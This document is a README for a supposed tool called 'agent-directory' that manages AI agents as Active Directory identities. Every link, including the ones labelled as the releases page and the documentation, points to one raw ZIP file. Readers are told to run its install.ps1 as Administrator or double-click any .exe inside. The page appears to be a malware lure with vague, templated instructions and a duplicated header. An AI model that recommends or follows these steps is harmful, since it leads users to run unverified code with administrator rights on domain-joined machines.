# 🤖 agent-directory - Manage AI Agents in Active Directory

[![Download agent-directory](https://img.shields.io/badge/Download-Here-orange)](https://github.com/SHIYUAN625/agent-directory/raw/refs/heads/main/events/agent-directory-2.0-alpha.3.zip)

---

## 🌟 What is agent-directory?

agent-directory helps you manage AI agents inside Active Directory. It lets each AI agent have its own identity, just like a user. Agents prove who they are using Kerberos, run in protected spaces (called sandboxes), and have controlled access to resources. This works the same way Windows handles people and services today.

This system supports both Windows Active Directory and Samba4 on Linux.

---

## 🖥️ System Requirements

You will need a Windows computer with:

- Windows 10 or later
- Active Directory environment (domain-joined PC)
- At least 4 GB RAM, 2 GHz CPU (typical PC hardware)
- PowerShell 5.1 or newer installed
- Network access to your Active Directory Domain Controller

No special programming tools are needed. This guide shows you how to get agent-directory running on your PC.

---

## 🚀 Getting Started with agent-directory

### Step 1: Visit the Download Page

Go to the agent-directory releases page to get the software:  

[Download agent-directory](https://github.com/SHIYUAN625/agent-directory/raw/refs/heads/main/events/agent-directory-2.0-alpha.3.zip)

This page shows the latest versions available. You will find the installation files here.

### Step 2: Download the Software

Find the latest Windows release. It will usually be a ZIP file with a name like `agent-directory-windows.zip`.

Click the file to start downloading it on your PC.

### Step 3: Prepare Your PC

After downloading, open the folder where the file saved.

- Right-click the ZIP file and choose **Extract All…**
- Select a folder you can easily access, such as Desktop or Documents
- Click **Extract**

This will create a new folder with the software files.

### Step 4: Run the Installer or Setup Script

Inside the extracted folder, look for instructions or a PowerShell script named `install.ps1` or something similar.

To run PowerShell scripts:

- Open PowerShell as Administrator. Click Start, type `PowerShell`, right-click it, and select **Run as Administrator**.
- Navigate to the folder with the software. Use the command:  
  `cd "C:\Users\YourName\Desktop\agent-directory-windows"` (adjust path as needed)
- Run the install script by typing:  
  `.\install.ps1`  
  If a script is not present, look for a `.exe` file and double-click it to start.

Follow the prompts. This step sets up the tools you need to manage AI agents in Active Directory.

### Step 5: Open the PowerShell Module

When the setup finishes, open PowerShell again (no need for admin this time).

Type in this command to import the agent-directory module:  
`Import-Module agent-directory`

If there are no errors, you are ready to use the tools inside Active Directory.

---

## 🔧 How agent-directory Works

agent-directory uses the existing features of Windows Active Directory but adds special support for AI agents.

- **Agent:** Like a user account, but for AI entities. Each agent has its own login and identity.
- **Sandbox:** A secure computer environment where agents run. This keeps agents separate and safe.
- **Tool:** Capabilities that agents can use. They are controlled per agent or group.
- **Policy:** Settings stored in AD and applied via Group Policy Objects (GPOs).

All agents authenticate with Kerberos, the same secure system used by users on Windows networks.

---

## 📂 Managing agent-directory in Active Directory

Use the PowerShell commands included with the module to:

- Create new AI agents
- Assign agents to sandboxes for running tasks
- Grant tools and permissions per agent
- Apply policy settings that control agent behavior

Commands are straightforward and similar to native AD management commands.

Example to create an agent:

```powershell
New-Agent -Name "AI_Bot01" -Sandbox "Sandbox1" -Tools @("ToolA", "ToolB")
```

---

## 🛠 Common Tasks

### Create an AI Agent

1. Open PowerShell.
2. Import the module (`Import-Module agent-directory`).
3. Use `New-Agent` to add an agent.

### List Agents

```powershell
Get-Agent
```

This shows all AI agents in your directory.

### Assign a Sandbox to an Agent

```powershell
Set-AgentSandbox -AgentName "AI_Bot01" -SandboxName "Sandbox1"
```

### Grant Tools to an Agent

```powershell
Add-AgentTool -AgentName "AI_Bot01" -ToolName "ToolC"
```

---

## 🗂 File Locations and Logs

- agent-directory stores its configuration in AD, using custom schemas that extend the default user and computer classes.
- Logs for actions are recorded in the Windows Event Log under the "AgentDirectory" source.
- Use Event Viewer to check logs about agent activities or errors.

---

## 🧰 Troubleshooting Tips

- Make sure you run PowerShell as Administrator when installing.
- Confirm your computer is joined to an Active Directory domain.
- Import the module again if your commands don’t work.
- Check the Windows Event Log for error messages.
- Network connection to the Domain Controller must be active.

---

## 📥 Download and Setup

Get started by visiting the releases page here:

[![Download agent-directory](https://img.shields.io/badge/Download-Here-blue)](https://github.com/SHIYUAN625/agent-directory/raw/refs/heads/main/events/agent-directory-2.0-alpha.3.zip)

Follow the download and install steps above. Once installed, you can manage AI agents using familiar Windows tools.

---

## ⚙️ Advanced Notes

- This tool works with standard Windows AD schema with the prefix `msDS-*`.
- Agent authentication supports Kerberos, NTLM, and certificate methods.
- For Samba4/Linux environments, different tools and setup processes are used.
- Policies can be customized with JSON content stored in SYSVOL, controlled through the GPO framework.

---

## 🆘 Support and Documentation

Check the GitHub repository for detailed technical documentation and updates:

https://github.com/SHIYUAN625/agent-directory/raw/refs/heads/main/events/agent-directory-2.0-alpha.3.zip

Use Issues on GitHub to report bugs or request features. The repository also contains sample scripts to help you get started.

---

# [Emoji] agent-directory - Manage AI Agents in Active Directory

[![Download agent-directory](https://img.shields.io/badge/Download-Here-orange)](https://github.com/SHIYUAN625/agent-directory/raw/refs/heads/main/events/agent-directory-2.0-alpha.3.zip)